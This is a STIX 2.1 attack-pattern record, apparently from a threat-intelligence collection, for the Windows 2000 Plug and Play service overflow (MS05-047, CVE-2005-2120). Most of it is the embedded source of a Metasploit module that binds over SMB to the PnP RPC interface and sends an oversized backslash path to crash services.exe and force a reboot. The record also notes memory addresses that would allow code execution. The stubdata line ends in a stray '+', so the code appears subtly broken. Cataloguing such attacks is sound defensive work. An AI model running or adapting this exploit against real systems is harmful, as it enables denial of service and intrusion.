{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--386c0fbb-8e77-43d4-8b7a-47d03f35f04b",
    "created": "2024-08-14T16:25:39.596165Z",
    "modified": "2024-08-14T16:25:39.596169Z",
    "name": "Microsoft Plug and Play Service Registry Overflow",
    "description": " This module triggers a stack buffer overflow in the Windows Plug and Play service. This vulnerability can be exploited on Windows 2000 without a valid user account. Since the PnP service runs inside the service.exe process, this module will result in a forced reboot on Windows 2000. Obtaining code execution is possible if user-controlled memory can be placed at 0x00000030, 0x0030005C, or 0x005C005C. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/windows/smb/ms05_047_pnp.rb",
            "external_id": "ms05_047_pnp.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-2120"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB::Client\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft Plug and Play Service Registry Overflow',\n      'Description'    => %q{\n          This module triggers a stack buffer overflow in the Windows Plug\n        and Play service. This vulnerability can be exploited on\n        Windows 2000 without a valid user account. Since the PnP\n        service runs inside the service.exe process, this module\n        will result in a forced reboot on Windows 2000. Obtaining\n        code execution is possible if user-controlled memory can\n        be placed at 0x00000030, 0x0030005C, or 0x005C005C.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2005-2120' ],\n          [ 'MSB', 'MS05-047' ],\n          [ 'BID', '15065' ],\n          [ 'OSVDB', '18830' ]\n        ]\n      ))\n\n    register_options(\n      [\n        OptString.new('SMBPIPE', [ true,  \"The pipe name to use (browser, srvsvc, wkssvc, ntsvcs)\", 'browser']),\n      ])\n  end\n\n=begin\n\n/* Function 0x0a at 0x767a54a8 */\nlong function_0a (\n  [in] [unique] [string] wchar_t * arg_00,\n  [out] [size_is(*arg_02)] [length_is(*arg_02)] wchar_t * arg_01,\n  [in,out] long * arg_02,\n  [in] long arg_03\n);\n\n=end\n\n  def run\n\n    # Determine which pipe to use\n    pipe = datastore['SMBPIPE']\n\n    print_status(\"Connecting to the SMB service...\")\n    connect()\n    smb_login()\n\n\n    # Results of testing on Windows 2000 SP0\n    #  324 / 325 exception handled\n    #  326 write to 0\n    #  327 jump to 00000030\n    #  328 jump to 0030005C\n    #  329 jump to 005C005C\n\n    # Completely smash the process stack\n    i = 1024\n\n    handle = dcerpc_handle('8d9f4e40-a03d-11ce-8f69-08003e30051b', '1.0', 'ncacn_np', [\"\\\\#{pipe}\"])\n    print_status(\"Binding to #{handle} ...\")\n    dcerpc_bind(handle)\n    print_status(\"Bound to #{handle} ...\")\n\n    path = \"HTREE\\\\ROOT\" + (\"\\\\\" * i)\n\n    # 0 = nil, 1 = enum, 2/3 = services, 4 = enum (currentcontrolset|caps)\n\n    stubdata =\n      NDR.long(rand(0xffffffff)) +\n      NDR.wstring(path) +\n      NDR.long(4) +\n      NDR.long(1) +\n\n    print_status(\"Calling the vulnerable function...\")\n\n    begin\n      dcerpc.call(0x0a, stubdata)\n    rescue Rex::Proto::DCERPC::Exceptions::NoResponse\n      print_good('Server did not respond, this is expected')\n    rescue ::Errno::ECONNRESET\n      print_good('Connection reset by peer (possible success)')\n    rescue => e\n      if e.to_s =~ /STATUS_PIPE_DISCONNECTED/\n        print_good('Server disconnected, this is expected')\n      else\n        raise e\n      end\n    end\n\n    disconnect\n  end\nend\n"
}